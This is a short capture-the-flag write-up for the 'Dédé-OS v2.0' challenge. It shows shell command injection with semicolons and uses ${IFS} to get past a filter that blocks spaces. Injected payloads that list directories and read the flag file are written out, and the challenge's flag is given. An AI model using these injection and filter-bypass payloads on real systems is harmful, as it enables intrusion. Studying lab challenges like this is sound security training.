# Dédé-OS v2.0

### Description

The owner is aware of your talent, he challenges you again.

### Solution

In this seconde episode of Dédé-OS, the administrator seems to have fixed an issue.
If we input `;ls;` it works, but spaces are not allowed.

```bash
$ ;ls -l;

Malicious attack detected.
```
The thing is we can't put spaces in commands because it is blocked by a filter.

Alternatively there is the `$IFS` variable which is empty.

```bash
$ echo "==${IFS}=="
==
==
```
Let's try this
```bash
$ ;ls${IFS}-la;

total 20
dr-xr-xr-x    1 root     root          4096 Nov 28 18:34 .
drwxr-xr-x    1 root     root          4096 Dec  3 13:36 ..
dr-xr-xr-x    1 root     root          4096 Nov 28 02:11 flag
-r-xr-xr-x    1 root     root          1417 Nov 28 02:11 index.php
-r-xr-xr-x    1 root     root           778 Nov 28 02:11 style.css
```
It works !

After exploring the server, the flag is here :
```bash
$ ;cat${IFS}flag/it/is/soon/here/flag.md;
```

Flag : `H2G2{w0w_4gaIN??_w1ll_b3_h4rdER_n3xT_T1me}`